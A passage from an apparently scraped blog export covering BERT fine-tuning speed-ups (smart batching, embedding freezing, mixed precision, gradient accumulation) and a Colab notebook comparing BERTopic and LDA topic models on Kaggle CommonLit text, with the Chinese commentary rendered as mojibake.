SmartBatchingSampler( data_source=self._data, batch_size=batch_size ) collate_fn = SmartBatchingCollate( targets=self._targets, max_length=max_len, pad_token_id=pad_id ) dataloader = DataLoader( dataset=self, batch_size=batch_size, sampler=self.sampler, collate_fn=collate_fn, num_workers=(multiprocessing.cpu_count()-1), pin_memory=True ) return dataloader class SmartBatchingSampler(Sampler): â€œæŒ‰åºåˆ—é•¿åº¦æ’åºï¼Œå¾—åˆ°ä¸€ç»„shuffleä¹‹åçš„batch dataâ€ def __init__(self, data_source, batch_size): super(SmartBatchingSampler, self).__init__(data_source) self.len = len(data_source) sample_lengths = [len(seq) for seq in data_source] argsort_inds = np.argsort(sample_lengths) self.batches = list(more_itertools.chunked(argsort_inds, n=batch_size)) self._backsort_inds = None def __iter__(self): if self.batches: last_batch = self.batches.pop(-1) np.random.shuffle(self.batches) self.batches.append(last_batch) self._inds = list(more_itertools.flatten(self.batches)) yield from self._inds def __len__(self): return self.len @property def backsort_inds(self): â€œæœªshuffleæ—¶ï¼Œbatchåºåˆ—æŒ‰ç…§é•¿åº¦æ’åºçš„ç»“æœâ€ if self._backsort_inds is None: self._backsort_inds = np.argsort(self._inds) return self._backsort_inds class SmartBatchingCollate: â€œæ¯ä¸ªbatchåˆ†åˆ«padåˆ°æœ€å¤§é•¿åº¦ï¼Œå¾—åˆ°attention maskï¼Œå¤„ç†targetâ€ def __init__(self, targets, max_length, pad_token_id): self._targets = targets self._max_length = max_length self._pad_token_id = pad_token_id def __call__(self, batch): if self._targets is not None: sequences, targets = list(zip(*batch)) else: sequences = list(batch) input_ids, attention_mask = self.pad_sequence( sequences, max_sequence_length=self._max_length, pad_token_id=self._pad_token_id ) if self._targets is not None: output = input_ids, attention_mask, torch.tensor(targets) else: output = input_ids, attention_mask return output def pad_sequence(self, sequence_batch, max_sequence_length, pad_token_id): max_batch_len = max(len(sequence) for sequence in sequence_batch) max_len = min(max_batch_len, max_sequence_length) padded_sequences, attention_masks = [[] for i in range(2)] attend, no_attend = 1, 0 for sequence in sequence_batch: # é™åˆ¶modelæ‰€å…è®¸çš„æœ€å¤§é•¿åº¦ new_sequence = list(sequence[:max_len]) attention_mask = [attend] * len(new_sequence) pad_length = max_len - len(new_sequence) new_sequence.extend([pad_token_id] * pad_length) attention_mask.extend([no_attend] * pad_length) padded_sequences.append(new_sequence) attention_masks.append(attention_mask) padded_sequences = torch.tensor(padded_sequences) attention_masks = torch.tensor(attention_masks) return padded_sequences, attention_masks ä½¿ç”¨ï¼š 12dataset = SmartBatchingDataset(train, tokenizer)dataloader = dataset.get_dataloader(batch_size=24, max_len=max_len, pad_id=tokenizer.pad_token_id) å·²ç»è¯æ˜ï¼Œè¿™ç§æŠ€æœ¯ä¸ä»…æ˜¾è‘—çš„å‡å°‘äº†è®­ç»ƒæ—¶é—´ï¼Œè€Œä¸”ä¸ä¼šå‡å°‘å‡†ç¡®æ€§ï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹ç”šè‡³æé«˜ï¼‰ã€‚ Freeze Embedding Freezing Embedding Layer of transformersåŠ é€Ÿè®­ç»ƒå¹¶èŠ‚çœæ˜¾å­˜ã€‚ ä¸€ç§è§£é‡Šæ˜¯ï¼ˆçœ‹çœ‹å°±å¥½ï¼Œæ²¡æœ‰ä¸¥æ ¼è¯æ˜ï¼‰ï¼šfinetuningç”¨çš„å°æ•°æ®é›†ä¸­ï¼Œæ–°å‡ºç°çš„tokenä¼šå¯¼è‡´åŸlanguage modelä¸­å­¦ä¹ å¥½çš„å±€éƒ¨åŒä¹‰è¯é—´ç»“æ„å…³ç³»è¢«ç ´åã€‚ 12345678910import transformersfrom transformers import AutoConfig, AutoModelForSequenceClassificationfreeze_embedding = Trueconfig = AutoConfig.from_pretrained('roberta-base')model = AutoModelForSequenceClassification.from_pretrained( _pretrained_model, config=config)model.base_model.embeddings.requires_grad_(not freeze_embedding) è¿™ç§æ–¹æ³•ï¼Œå¯ä»¥ä¸€è¯•ï¼Œå¯ä»¥ç”¨æ›´å¤§çš„batch sizeã€‚ Numeric Precision Reduction æ··åˆç²¾åº¦ã€‚å¸¸è§çš„æ¨ç†åŠ é€Ÿæ–¹æ³•ã€‚ åœ¨è¿‡å»çš„å‡ å¹´ï¼ŒGPUç¡¬ä»¶å¯¹float16æ“ä½œçš„ç³Ÿç³•æ”¯æŒï¼Œæ„å‘³ç€é™ä½æƒé‡å’Œæ¿€æ´»å€¼çš„ç²¾åº¦é€šå¸¸ä¼šé€‚å¾—å…¶åï¼Œä½†æ˜¯NVIDIA Voltaå’ŒTuringæ¶æ„ä¸å¼ é‡æ ¸å¿ƒçš„å¼•å…¥ï¼Œæ„å‘³ç€ç°ä»£GPUå¯ä»¥æ›´é«˜æ•ˆçš„æ”¯æŒfloat16è¿ç®—ã€‚ å¤§å¤šæ•°transformerç½‘ç»œéƒ½å¯ä»¥ç®€å•åœ°è½¬æ¢ä¸ºfloat16æƒå€¼å’Œæ¿€æ´»å€¼è®¡ç®—ï¼Œè€Œæ²¡æœ‰ç²¾åº¦æŸå¤±ã€‚ ä¹‹æ‰€ä»¥è¦ä¿ç•™float32ï¼Œæ˜¯å› ä¸ºåƒsoftmaxè¿™ç±»ï¼Œè®¡ç®—æ—¶æœ‰è¾ƒé•¿çš„è¿åŠ è¿ç®—ï¼Œè¿™æ—¶ä½¿ç”¨float16å¯èƒ½å­˜åœ¨ç²¾åº¦æŸå¤±ã€‚ åŠç²¾åº¦çš„åŠ é€Ÿæ¥æºäºï¼ŒåŠç²¾åº¦è®¡ç®—æŒ‡ä»¤æœ¬èº«çš„é€Ÿåº¦æ›´å¿«ï¼Œå¦å¤–æ­¤æ—¶å¯ä»¥ä½¿ç”¨æ›´å¤§çš„batch sizeã€‚ å¼€æºå·¥å…·ï¼šNVIDIA-apexï¼›torch.cuda.amp--ç›¸æ¯”AMPï¼Œä½¿ç”¨æ›´çµæ´»ä¸€äº›ï¼Œä½†æ˜¯ç”¨èµ·æ¥éƒ½å·®ä¸å¤šã€‚ æ³¨æ„ï¼šå°batch sizeæ—¶ï¼Œæ··åˆç²¾åº¦ä¼šç”±äºé¢‘ç¹IOå¯¼è‡´çš„æ—¶é—´æŸå¤±å¤§äºå°batchçš„åŠç²¾åº¦è®­ç»ƒæ‰€èŠ‚çœçš„æ—¶é—´ã€‚ ç¤ºä¾‹ Gradient Accumulation å°±æ˜¯ç´¯è®¡æ¢¯åº¦å‡ ä¸ªè½®æ¬¡ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡å‚æ•°æ›´æ–°ã€‚ ç¤ºä¾‹ç¨‹åº 1234567891011optimizer.zero_grad() # Reset gradients tensorsfor i, (inputs, labels) in enumerate(training_set): predictions = model(inputs) # Forward pass loss = loss_function(predictions, labels) # Compute loss function loss = loss / accumulation_steps # Normalize our loss (if averaged) loss.backward() # Backward pass if (i+1) % accumulation_steps == 0: # Wait for several backward steps optimizer.step() # Now we can do an optimizer step optimizer.zero_grad() # Reset gradients tensors if (i+1) % evaluation_steps == 0: # Evaluate the model when we... evaluate_model() # ...have no gradients accumulated å¦‚æœæˆ‘ä»¬çš„æŸå¤±æ˜¯åœ¨è®­ç»ƒæ ·æœ¬ä¸Šå¹³å‡çš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é™¤ä»¥ç§¯ç´¯æ­¥éª¤çš„æ•°é‡ã€‚ Gradient Checkpointing ä»¥æ—¶é—´ä¸ºä»£ä»·ï¼ŒèŠ‚çœGPUå†…å­˜ã€‚ é€šè¿‡å°†æ¨¡å‹åˆ†ä¸ºä¸åŒçš„æ®µï¼Œæ¯ä¸ªæ®µè®¡ç®—æ—¶ï¼Œåˆ†åˆ«è¿›è¡Œè®¡ç®—ï¼Œå°†å½“å‰æ®µè®¡ç®—ç»“æœä¼ ç»™ä¸‹ä¸€ä¸ªæ®µåï¼Œå½“å‰æ®µçš„ä¸­é—´çŠ¶æ€éƒ½ä¸ä¼šä¿å­˜ã€‚ ç¤ºä¾‹ PyTorch Checkpointå¤šGPUä¼˜åŒ– å…¶ä»–å¼€æºå·¥å…· DeepSpeed FairScale Accelerate Some Exp è®²å®è¯å°æ ·é›†çš„æ¯”èµ›ï¼Œæ˜¯ä¸ªè°ƒå‚æ¸¸æˆï¼Œå¯¹äºå›å½’ä»»åŠ¡ï¼Œæ›´æ˜¯å¦‚æ­¤ã€‚ç»“æ„ä¸Šç©å‡ºèŠ±ï¼Œæ•ˆæœåè€Œä¸å¥½ã€‚ä¼˜åŒ–æ–¹æ³•ä¸Šï¼Œå¸¸è§çš„FGMå’ŒSWAå¯¹äºä¸€äº›å›å½’ä»»åŠ¡ï¼ŒåŸºæœ¬æ²¡å•¥æ•ˆæœæå‡ã€‚æ²¡æœ‰å°è¯•è¿‡å¯¹æ¯”å­¦ä¹ ï¼Œå¯èƒ½è¿™æ˜¯ä¸€ä¸ªå¥½æ–¹æ³•ã€‚ æ¯”èµ›ä¸­å¯¹äºè¿™ç±»å¼ºå­¦ä¹ æ¨¡å‹ï¼Œè¿˜æ˜¯æœ€å¥½baggingï¼Œé™é™varianceã€‚ åªæŠŠBERTè¿™äº›åºç„¶å¤§ç‰©å½“åšç‰¹å¾æŠ½å–å™¨ï¼Œç„¶åç”¨ä¼ ç»ŸMLç®—æ³•æ¥å­¦ä¹ ï¼Œä¼šæ˜¯æ›´æ–¹ä¾¿å¿«æ·çš„æ–¹æ³•ï¼Œè€Œä¸”å®è·µä¸Šä¹Ÿç¡®å®å¯è¡Œï¼Œåªæ˜¯å¾ˆå®¹æ˜“è¿‡æ‹Ÿåˆï¼ŒBERTç‰¹å¾è¿˜æ˜¯å¤ªå¼ºäº†ï¼ˆå½“ç„¶è¿™å–å†³äºå¦‚ä½•è®­ç»ƒå’Œè®­ç»ƒçš„ç¨‹åº¦ï¼‰ã€‚è¿™å¯èƒ½æ›´å¿«ï¼Œä½†æ˜¯å¾—åˆ°å¥½ç»“æœéœ€è¦ä¸€äº›â€œè¿æ°”â€ï¼Œè¿˜æœ‰ä¸€ç‚¹ç›´è§‰ã€‚ å¯¹äºæ¯”èµ›è€Œè¨€ï¼Œlargeæ¨¡å‹å¾—åˆ°å¥½ç»“æœè¿˜æ˜¯å®¹æ˜“ä¸€äº›ï¼Œå°±åƒå¥½å¤šè®ºæ–‡ï¼Œå…¶å®æ–¹æ³•å°±é‚£æ ·ï¼Œä¸»è¦BERT ç±»æ¨¡å‹ç”¨largeè°ƒå¾—å¥½ï¼Œä¹Ÿå®¹æ˜“å‡ºå¥½ç»“æœã€‚å¯è§£é‡Šçš„ä½™åœ°è¿˜æ˜¯å¤ªå·®äº†ã€‚å„éƒ¨åˆ†åˆå‡ ä¹æ˜¯å…³è”çš„ï¼Œè€¦åˆåœ¨ä¸€èµ·ï¼Œæ‰€ä»¥ç®—äº†ã€‚ å¥½çš„ç®—æ³•ï¼Œä¸åº”è¯¥æ˜¯äº¿çº§å‚æ•°å¯¹æ•°æ®çš„å˜ç›¸è®°å¿†ï¼Œé‚£æ˜¯â€œæ•°æ®åº“â€çš„åŠ æƒæ±‚å’Œä¸æ¿€æ´»å‡½æ•°ç­›é€‰ã€‚è®©äººæ„Ÿè§‰å¤±æœ›ã€‚è¿™é‡Œçš„ä¸€é¢ä¹‹è¯æ˜¯ï¼Œå¤§æ¨¡å‹ï¼Œæ€»æ˜¯â€œä¸å¤ªå¥½â€ã€‚å¯æ˜¯ï¼Œæ•ˆæœæœ‰äº†ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œè¿˜æ˜¯ä¼šçœŸé¦™ã€‚ NLP Tutorial The Super Duper NLP Repo Huggingface Community Hugging Faceâ€™s notebooks referenceï¼š kaggle rhtsingh REVISITING FEW-SAMPLE BERT FINE-TUNING ON THE STABILITY OF FINE-TUNING BERT SMART: Robust and Efficient Fine-Tuning for Pre-trained Natural Language Models Fine-Tuning Pretrained Language Models:Weight Initializations, Data Orders, and Early Stopping MIXOUT: EFFECTIVE REGULARIZATION TO FINETUNE LARGE-SCALE PRETRAINED LANGUAGE MODELS How to Fine-Tune BERT for Text Classification? Sentence Encoders on STILTs: Supplementary Training on Intermediate Labeled-data Tasks","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"}]},{"title":"BERT_topic_analysis","slug":"BERT-topic-analysis","date":"2021-07-19T14:26:37.000Z","updated":"2023-08-07T11:54:31.026Z","comments":true,"path":"posts/c228cec2.html","link":"","permalink":"https://racleray.github.io/posts/c228cec2.html","excerpt":"ç®€å•å­¦ä¹ ä¸‹BERT Topic Analysisçš„ç›¸å…³å†…å®¹ï¼Œçœ‹çœ‹Kaggleä¸Šçš„ä»£ç å®éªŒã€‚","text":"è¿è¡Œ Colab Connect to kaggle 12345678!pip install --user kaggle!mkdir /root/.kaggle!mv /content/kaggle.json /root/.kaggle/kaggle.json!kaggle competitions download -c commonlitreadabilityprize!ls 123456import osfor filename in os.listdir('.'): if filename.endswith('.zip'): os.system(\"unzip &#123;&#125;\".format(filename)) os.system(\"rm &#123;&#125;\".format(filename)) Visualization with Bokeh 123456789!pip install --upgrade pip!pip install --upgrade numpy!pip install --upgrade sentence_transformers!conda install -c conda-forge hdbscan --y!pip install bokeh!pip install --upgrade bertopic[visualization]# !pip uninstall numpy# !pip install numpy 1234567891011121314151617181920212223from bertopic import BERTopicimport pandas as pdfrom sentence_transformers import SentenceTransformerimport sklearn.manifoldimport umapimport numpy as npimport pandas as pdimport randomfrom nltk.corpus import stopwordsrandom.seed(42)from bokeh.io import output_file, showfrom bokeh.models import ColumnDataSource, HoverTool, LinearColorMapperfrom bokeh.palettes import plasma, d3, Turbo256from bokeh.plotting import figurefrom bokeh.transform import transformimport bokeh.iobokeh.io.output_notebook()import bokeh.plotting as bplimport bokeh.models as bmobpl.output_notebook() è¯»å–æ•°æ® 123456789101112test = pd.read_csv('test.csv')train = pd.read_csv('train.csv')train['set'] = 'train'test['set'] = 'test'combined = pd.concat([train, test], ignore_index=True)combined.target.fillna(3, inplace=True)texts = combined.excerpt.values.tolist()targets = combined.target.values.tolist()sets = combined.set.values.tolist() æ–‡æœ¬å¤„ç†ï¼ˆå¯é€‰ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839# def preprocess_tweet_data(data,name):# # Lowering the case of the words in the sentences# data[name]=data[name].str.lower()# # Code to remove the Hashtags from the text# data[name]=data[name].apply(lambda x:re.sub(r'\\B#\\S+','',x))# # Code to remove the links from the text# data[name]=data[name].apply(lambda x:re.sub(r\"http\\S+\", \"\", x))# # Code to remove the Special characters from the text # data[name]=data[name].apply(lambda x:' '.join(re.findall(r'\\w+', x)))# # Code to substitute the multiple spaces with single spaces# data[name]=data[name].apply(lambda x:re.sub(r'\\s+', ' ', x, flags=re.I))# # Code to remove all the single characters in the text# data[name]=data[name].apply(lambda x:re.sub(r'\\s+[a-zA-Z]\\s+', '', x))# # Remove the twitter handlers# data[name]=data[name].apply(lambda x:re.sub('@[^\\s]+','',x))def preprocess(data): excerpt_processed=[] for e in data['excerpt']: # find alphabets e = re.sub(\"[^a-zA-Z]\", \" \", e) e = re.sub(r'\\s+', ' ', e, flags=re.I) # # convert to lower case # e = e.lower() # tokenize words e = nltk.word_tokenize(e) # remove stopwords e = [word for word in e if not word.lower() in set(stopwords.words(\"english\"))] # lemmatization lemma = nltk.WordNetLemmatizer() e = [lemma.lemmatize(word) for word in e] e=\" \".join(e) excerpt_processed.append(e) return excerpt_processed ä½¿ç”¨sentence bertè®¡ç®—æ–‡æ¡£å‘é‡ 1model = SentenceTransformer('stsb-distilbert-base') id1embeddings = model.encode(texts) é™ç»´ t-SNE ä¸ umap t-SNEä¿ç•™æ•°æ®ä¸­å±€éƒ¨ç»“æ„ã€‚ UMAPä¿ç•™æ•°æ®ä¸­çš„æœ¬åœ°å’Œå¤§éƒ¨åˆ†å…¨å±€ç»“æ„ã€‚ UMAPæ¯”tSNEè¦å¿«å¾—å¤šï¼Œå½“é¢å¯¹æ›´å¤šæ•°æ®ã€æ›´é«˜ç»´æ•°æ®æ—¶ 12color_mapper = LinearColorMapper(palette='Plasma256', low=min(targets), high=max(targets))out = sklearn.manifold.TSNE(n_components=2).fit_transform(embeddings) ç»˜åˆ¶Bokenã€‚test setæ ‡ç­¾è®¾ç½®ä¸º3ã€‚ 123456789101112131415161718192021SETS = ['train', 'test']MARKERS = ['circle', 'triangle']list_x = out[:,0]list_y = out[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, targets=targets, dset=sets))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), (\"(x,y)\", \"(@x, @y)\"), ('desc', '@desc'), ('targets', '@targets'), ('dset', '@dset')])p = figure(plot_width=800, plot_height=800, tools=[hover], title=\"First Look at the Data\")p.scatter('x', 'y', size=10, source=source, legend='dset', color=&#123;'field': 'targets', 'transform': color_mapper&#125;, marker=bokeh.transform.factor_mark('dset', MARKERS, SETS),)bpl.show(p) 12umap_model = umap.UMAP(n_neighbors=15, n_components=2, metric='cosine')out_umap = umap_model.fit_transform(embeddings) 123456789101112131415161718192021SETS = ['train', 'test']MARKERS = ['circle', 'triangle']list_x = out_umap[:,0]list_y = out_umap[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, targets=targets, dset=sets))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), (\"(x,y)\", \"(@x, @y)\"), ('desc', '@desc'), ('targets', '@targets'), ('dset', '@dset')])p = figure(plot_width=800, plot_height=800, tools=[hover], title=\"First Look at the Data\")p.scatter('x', 'y', size=10, source=source, legend='dset', color=&#123;'field': 'targets', 'transform': color_mapper&#125;, marker=bokeh.transform.factor_mark('dset', MARKERS, SETS),)bpl.show(p) Kmeans è§‚å¯Ÿæ•°æ® 12345from sklearn.decomposition import PCAfrom sklearn.cluster import MiniBatchKMeansfrom sklearn.metrics import silhouette_samples, silhouette_scoreimport matplotlib.pyplot as pltimport matplotlib.cm as cm 1234567891011121314151617def find_optimal_clusters(data, max_k): iters = range(2, max_k+1, 1) sse = [] # è½®å»“ç³»æ•° for k in iters: cluster = MiniBatchKMeans(n_clusters=k, init_size=256, batch_size=512, random_state=20).fit(data) silhouette_avg = silhouette_score(data, cluster.labels_) sse.append(silhouette_avg) print('Fit &#123;&#125; clusters'.format(k)) f, ax = plt.subplots(1, 1) ax.plot(iters, sse, marker='o') ax.set_xlabel('Cluster Centers') ax.set_xticks(iters) ax.set_xticklabels(iters) ax.set_ylabel('SSE') ax.set_title('SSE by Cluster Center Plot') colab1find_optimal_clusters(embeddings, 20) 1clusters_2 = MiniBatchKMeans(n_clusters=2, init_size=256, batch_size=512, random_state=20).fit_predict(embeddings) 1234567891011121314151617181920212223242526def plot_tsne_pca_umap(data, labels): max_label = max(labels)+1 max_items = np.random.choice(range(data.shape[0]), size=2700, replace=False) # reducer = umap.UMAP(n_components=2) pca = PCA(n_components=2).fit_transform(data[max_items,:]) tsne = sklearn.manifold.TSNE(n_components=2).fit_transform(embeddings) uma = umap.UMAP(n_components=2).fit_transform(embeddings) idx = np.random.choice(range(pca.shape[0]), size=320, replace=False) label_subset = labels[max_items] label_subset = [cm.hsv(i/max_label) for i in label_subset[idx]] f, ax = plt.subplots(1, 3, figsize=(14, 6)) ax[0].scatter(pca[idx, 0], pca[idx, 1], c=label_subset) ax[0].set_title('PCA Cluster Plot') ax[1].scatter(tsne[idx, 0], tsne[idx, 1], c=label_subset) ax[1].set_title('TSNE Cluster Plot') ax[2].scatter(uma[idx,0],uma[idx,1],c=label_subset) ax[2].set_title('UMAP Cluster Plot') plot_tsne_pca_umap(embeddings, clusters_2) Topic BERT topic BERTopicä¾èµ–äºå¥å­åµŒå…¥å’Œèšç±»ç®—æ³•ï¼Œä»¥åŠé™ç»´ï¼Œç”Ÿæˆæ–‡æ¡£ä¸»é¢˜ç°‡ã€‚ 12model = BERTopic(language=\"english\", min_topic_size=20)topics, probs = model.fit_transform(texts) 12345678topic_words = ['-1: outlier']for i in range(len(set(topics))-1): tpc = model.get_topic(i)[:8] words = [x[0] for x in tpc] tw = ' '.join([str(i) + ':'] + words) topic_words.append(tw)exp_topics = [topic_words[x+1] for x in topics] 1len(set(topics)) 1234567891011121314151617181920212223242526clrs = random.sample(Turbo256, len(set(topics)))color_map = bmo.CategoricalColorMapper(factors=topic_words, palette=clrs)list_x = out[:,0]list_y = out[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, topic=exp_topics, target=targets, dset=sets,))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), ('desc', '@desc'), ('topic', '@topic'), ('target', '@target'), ('dset', '@dset'),])p = figure(plot_width=800, plot_height=800, tools=[hover], title=\"Topics from BERTopic model\")p.scatter('x', 'y', size=10, source=source, fill_color=transform('topic', color_map), marker=bokeh.transform.factor_mark('dset', MARKERS, SETS), legend='dset')# p.legend.location = \"top_left\"# p.legend.click_policy=\"hide\"bokeh.plotting.show(p) 123456789101112topic_df = model.get_topic_freq()def get_keywords(i): if i == -1: return 'outlier' tpc = model.get_topic(i)[:8] words = [x[0] for x in tpc] tw = ' '.join(words) return twtopic_df['keywords'] = topic_df['Topic'].apply(get_keywords)topic_df 1model.get_topic(0) 1model.visualize_topics() 1# model.visualize_distribution(probs) Classic LDA id1import os 1!pip install -Uqq gensim==3.8.3 123456# import os #importing os to set environment variable# def install_java():# !apt-get install -y openjdk-8-jdk-headless -qq &gt; /dev/null #install openjdk# os.environ[\"JAVA_HOME\"] = \"/usr/lib/jvm/java-8-openjdk-amd64\" #set environment variable# !java -version #check java version# install_java() 12!wget -q http://mallet.cs.umass.edu/dist/mallet-2.0.8.zip!unzip -qq mallet-2.0.8.zip 12os.environ['MALLET_HOME'] = '/content/mallet-2.0.8'mallet_path = '/content/mallet-2.0.8/bin/mallet' # you should NOT need to change this 12345678910111213141516import gensimimport gensim.corpora as corporafrom gensim.utils import simple_preprocessfrom gensim.models.wrappers import LdaMalletfrom gensim.models.coherencemodel import CoherenceModelfrom gensim import similaritiesimport os.pathimport reimport globimport nltknltk.download('stopwords')from nltk.tokenize import RegexpTokenizerfrom nltk.corpus import stopwords 1234567891011121314151617181920212223242526272829303132333435def preprocess_data(doc_set,extra_stopwords = &#123;&#125;): # adapted from https://www.datacamp.com/community/tutorials/discovering-hidden-topics-python # replace all newlines or multiple sequences of spaces with a standard space doc_set = [re.sub('\\s+', ' ', doc) for doc in doc_set] # initialize regex tokenizer tokenizer = RegexpTokenizer(r'\\w+') # create English stop words list en_stop = set(stopwords.words('english')) # add any extra stopwords if (len(extra_stopwords) &gt; 0): en_stop = en_stop.union(extra_stopwords) # list for tokenized documents in loop texts = [] # loop through document list for i in doc_set: # clean and tokenize document string raw = i.lower() tokens = tokenizer.tokenize(raw) # remove stop words from tokens stopped_tokens = [i for i in tokens if not i in en_stop] # add tokens to list texts.append(stopped_tokens) return textsdef prepare_corpus(doc_clean): # adapted from https://www.datacamp.com/community/tutorials/discovering-hidden-topics-python # Creating the term dictionary of our courpus, where every unique term is assigned an index. dictionary = corpora.Dictionary(doc_clean) dictionary = corpora.Dictionary(doc_clean) dictionary.filter_extremes(no_below=5, no_above=0.5) # Converting list of documents (corpus) into Document Term Matrix using dictionary prepared above. doc_term_matrix = [dictionary.doc2bow(doc) for doc in doc_clean] # generate LDA model return dictionary,doc_term_matrix 12doc_clean = preprocess_data(texts,&#123;&#125;)dictionary, doc_term_matrix = prepare_corpus(doc_clean) 12number_of_topics=30 # adjust this to alter the number of topicswords=10 #adjust this to alter the number of words output for the topic below 1ldamallet = LdaMallet(mallet_path, corpus=doc_term_matrix, num_topics=number_of_topics, id2word=dictionary, alpha=10) 123456789# topic_words = ldamallet.show_topics(num_topics=number_of_topics,num_words=5)# topic_words = [x[1] for x in topic_words]topic_words = []for i in range(number_of_topics): tpc = ldamallet.show_topic(i, topn=7, num_words=None) words = [x[0] for x in tpc] tw = ' '.join([str(i) + ':'] + words) topic_words.append(tw) 1topic_words 123456789101112# show resulttopics_docs = list()for m in ldamallet[doc_term_matrix[:1000]]: topics_docs.append(m)x = np.array(topics_docs[:1000])y = np.delete(x,0,axis=2)y = y.squeeze()best_topics = np.argmax(y, axis=1) # ç»“æœæ˜¯ä¸€ä¸ªåˆ†å¸ƒtopics = list(best_topics)topics = [topic_words[x] for x in topics] 1234567891011121314151617181920212223clrs = random.sample(Turbo256, number_of_topics)color_map = bmo.CategoricalColorMapper(factors=topic_words, palette=clrs)list_x = out[:,0]list_y = out[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, topic=topics))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), ('desc', '@desc'), ('topic', '@topic')])p = figure(plot_width=1200, plot_height=600, tools=[hover], title=\"Test\")p.circle('x', 'y', size=10, source=source, fill_color=transform('topic', color_map), # legend='topic')# p.legend.location = \"top_left\"# p.legend.click_policy=\"hide\"bpl.show(p) çœ‹ä¸Šé¢çš„å›¾è¡¨ï¼Œç”±LDAé‡æ–°è¯†åˆ«çš„ä¸»é¢˜å†…æ–‡æ¡£ä¸ä¸€å®šç›¸äº’æ¥è¿‘ã€‚ ä¸BERTopicæ˜¯äº’è¡¥çš„ï¼Œå¯ä»¥å¾—åˆ°ä¸åŒçš„ä¸»é¢˜è¡¨ç¤ºã€‚ Bertopicåœ¨çŸ­æ–‡æœ¬è¿™ç±»å¯èƒ½åªæœ‰ä¸€ä¸ªä¸»é¢˜çš„æ–‡æœ¬ä¸­è¡¨ç°è¾ƒå¥½ï¼Œè€ŒLDAå¯ä»¥æ›´å¥½åœ°å¤„ç†ä¸»é¢˜ç»„åˆè¾ƒå¤šçš„æ–‡æœ¬ã€‚ ä¸¤è€…å¯ä»¥äº’è¡¥ï¼Œå› æ­¤å°è¯•ä¸¤è€…éƒ½æœ‰æ„ä¹‰ã€‚ è¿™å’Œä¸¤è€…çš„åŸç†æ˜¯ç›¸å…³çš„ï¼ŒBertopicæ˜¯ç©ºé—´è·ç¦»çš„èšç±»ï¼ŒLDAæ˜¯ç»Ÿè®¡å±‚é¢çš„å…±ç°è§„å¾‹åˆ†æã€‚ 12# pyLDAviså¯è§†åŒ–!pip install -Uqq pyLDAvis==2.1.2 1gensimmodel = gensim.models.wrappers.ldamallet.malletmodel2ldamodel(ldamallet) 123456import pyLDAvisimport pyLDAvis.gensimpyLDAvis.enable_notebook()p = pyLDAvis.gensim.prepare(gensimmodel, doc_term_matrix, dictionary)p ref: https://skok.ai/2021/05/27/Topic-Models-Introduction.html BERTopic è¯¦è§£ BERTopicï¼Œåˆ©ç”¨BERTåµŒå…¥å’Œc-TF-IDFæ¥åˆ›å»ºå¯†é›†çš„é›†ç¾¤ï¼Œä½¿è¯é¢˜æ˜“äºè§£é‡Šï¼ŒåŒæ—¶åœ¨è¯é¢˜æè¿°ä¸­ä¿ç•™é‡è¦è¯æ±‡ã€‚å…¶æ ¸å¿ƒæ­¥éª¤ä¸»è¦æ˜¯åšä¸‰ä»¶äº‹ï¼š ç”¨åŸºäºBERTçš„Sentence Transformersæå–è¯­å¥åµŒå…¥ é€šè¿‡UMAPå’ŒHDBSCANï¼Œå°†æ–‡æ¡£åµŒå…¥è¿›è¡Œèšç±»ï¼Œè¯­ä¹‰ç›¸è¿‘çš„è¯­å¥å°†èšé›†æˆç°‡ç¾¤ ç”¨c-TF-IDFæå–ä¸»é¢˜è¯ c-TF-IDFå°±æ˜¯å°†ä¸€ä¸ªä¸»é¢˜ä¸‹çš„æ‰€æœ‰æ–‡æ¡£è¿æ¥åœ¨ä¸€èµ·æˆä¸ºä¸€ä¸ªæ–‡æ¡£ï¼Œåœ¨ä¸»é¢˜é—´è®¡ç®—TF-IDFçš„æ–¹æ³•ã€‚ 12345678910111213import numpy as npimport pandas as pdimport jiebaimport umapimport hdbscanfrom sentence_transformers import SentenceTransformerfrom sklearn.feature_extraction.text import CountVectorizerfrom sklearn.metrics.pairwise import cosine_similarityfrom tqdm import tqdmimport matplotlib.pyplot as plt# import sys# sys.setrecursionlimit(1000000) 1234567891011121314151617181920212223242526272829303132333435363738394041424344# model = SentenceTransformer(r'my_pretrained_chinese_embeddings')# embeddings = model.encode(data['review'].tolist(), show_progress_bar=True)#### é™ç»´umap_embeddings = umap.UMAP( n_neighbors=25, n_components=10, min_dist=0.00, metric='cosine', random_state=2020).fit_transform(embeddings)#### èšç±»# ä½¿ç”¨HDBSCANæ¥å¯»æ‰¾é«˜å¯†ç°‡cluster = hdbscan.HDBSCAN( min_cluster_size=30, metric='euclidean', cluster_selection_method='eom', prediction_data=True).fit(umap_embeddings)#### c-TF-IDFdef c_tf_idf(documents, m, ngram_range=(1, 1)): my_stopwords = [i.strip() for i in open('stop_words_zh.txt',encoding='utf-8').readlines()] count = CountVectorizer( ngram_range=ngram_range, stop_words= my_stopwords).fit(documents) t = count.transform(documents).toarray() w = t.sum(axis=1) tf = np.divide(t.T, w) sum_t = t.sum(axis=0) idf = np.log(np.divide(m, sum_t)).reshape(-1, 1) tf_idf = np.multiply(tf, idf) return tf_idf, count#### ä¸»é¢˜å½’å¹¶# 